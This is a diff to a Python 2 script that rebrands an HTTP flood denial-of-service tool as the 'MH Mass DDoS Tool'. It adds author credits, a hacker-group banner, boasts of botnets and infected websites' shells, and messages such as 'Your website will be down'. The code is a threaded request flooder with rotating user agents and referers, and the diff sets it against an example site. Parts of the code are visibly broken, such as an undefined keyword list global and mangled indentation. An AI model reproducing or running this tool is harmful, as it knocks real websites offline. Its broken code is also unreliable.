@@ -1,17 +1,19 @@
+
 import urllib2
 import sys
 import threading
 import random
 import re
 
-
-url=''                                                                                              
-host=''                                                                                          
+#global params                                                                                       
+url=''                                                                                              ###############################
+host=''                                                                                             #~~~~Created By M1N3~~~~#
 headers_useragents=[]                                                                               
 headers_referers=[]                                                                                 
 request_counter=0                                                                                   
 flag=0                                                                                              
-safe=0                                                                                           =
+safe=0                                                                                              ###############################
+
 def inc_counter():
 	global request_counter
 	request_counter+=45
@@ -24,6 +26,7 @@ def set_safe():
 	global safe
 	safe=1
 	
+# generates a user agent array
 def useragent_list():
 	global headers_useragents
 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
@@ -40,17 +43,17 @@ def useragent_list():
 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
 	return(headers_useragents)
 
-
+# generates a referer array
 def referer_list():
 	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')                                      
-	headers_referers.append('http://www.usatoday.com/search/results?q=')                      
-	headers_referers.append('http://engadget.search.aol.com/search?q=')                      
-	headers_referers.append('http://www.google.com/?q=')                                      
-	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
-	headers_referers.append('http://engadget.search.aol.com/search?q=')                       
-	headers_referers.append('http://www.bing.com/search?q=')                                  
-	headers_referers.append('http://search.yahoo.com/search?p=')                               
+	headers_referers.append('http://www.google.com/?q=')                                       ############################
+	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Pre-configured            #
+	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #Botnets                   #
+	headers_referers.append('http://www.google.com/?q=')                                       #Infected's Websites       #
+	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Best's Shells Only        #
+	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by M1N3#
+	headers_referers.append('http://www.bing.com/search?q=')                                   #From M Hackers       #
+	headers_referers.append('http://search.yahoo.com/search?p=')                               ############################
 	headers_referers.append('http://www.ask.com/web?q=')
 	headers_referers.append('http://search.lycos.com/web/?q=')
 	headers_referers.append('http://busca.uol.com.br/web/?q=')
@@ -65,15 +68,16 @@ def referer_list():
 	headers_referers.append('http://api.duckduckgo.com/html/?q=')
 	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
 
-
+# generates a Keyword list	
 def keyword_list():
         global keyword_top
-        keyword_top.append('botnet module')
+        keyword_top.append('M Hackers')
 
 
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 	
+#builds random ascii string
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
@@ -82,12 +86,29 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
+	print 'MH Mass DDoS Tool created by M1N3'
+	print 'M Hackers Facebook Page: https://www.facebook.com/M-Hackers-523388257837691/'
+	print 'Usage: MH.py (url)'
+	print 'Example: MH.py http://hackthissite.com/'
 	print "\a"
 print \
-"""                                                   
+"""                                                       
+  *****           *****
+  ******         ******
+  *** ***       *** ***
+  ***  ***     ***  ***
+  ***   ***   ***   ***
+  ***    *** ***    ***
+  ***      ***      ***
+  ***       *       ***
+  ***               ***
+  ***               ***
+  ***               ***
+  ***               ***
+
+--------M HACKERS--------
 _________________________
-                                
-DDOS Module for botnet                
+                                                
 """
 
 	
@@ -111,15 +132,17 @@ def httpcall(url):
 	try:
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
+			#print e.code
 			set_flag(1)
             
  			print '                                                                    '
- 			print '***** firing *****'
- 			print '***** firing *****'
+ 			print '***** We Are M Hackers *****'
+ 			print '***** Your website will be down *****'
  			print '                                                                    '
                                                          
 			code=500
 	except urllib2.URLError, e:
+			#print e.reason
 			sys.exit()
 	else:
 			inc_counter()
@@ -127,6 +150,7 @@ def httpcall(url):
 	return(code)		
 
 	
+#http caller thread 
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
@@ -137,16 +161,18 @@ class HTTPThread(threading.Thread):
 		except Exception, ex:
 			pass
 
+# monitors http threads and counts requests
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
 			if (previous+150<request_counter) & (previous<>request_counter):
-				print "#~~~>Sent: %d Sending more<~~~#" % (request_counter)
+				print "#~~~>MH DDoS Attack's Sended: %d Sending more<~~~#" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n ~>Stopping the module Attack<~"
+			print "\n ~>Stopping the mass DDoS Attack<~"
 
+#execute 
 if len(sys.argv) < 2:
 	usage()
 	sys.exit()
@@ -155,7 +181,8 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Starting"
+		print "Starting the MH DDoS Tool"
+		print "Created By M1N3"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
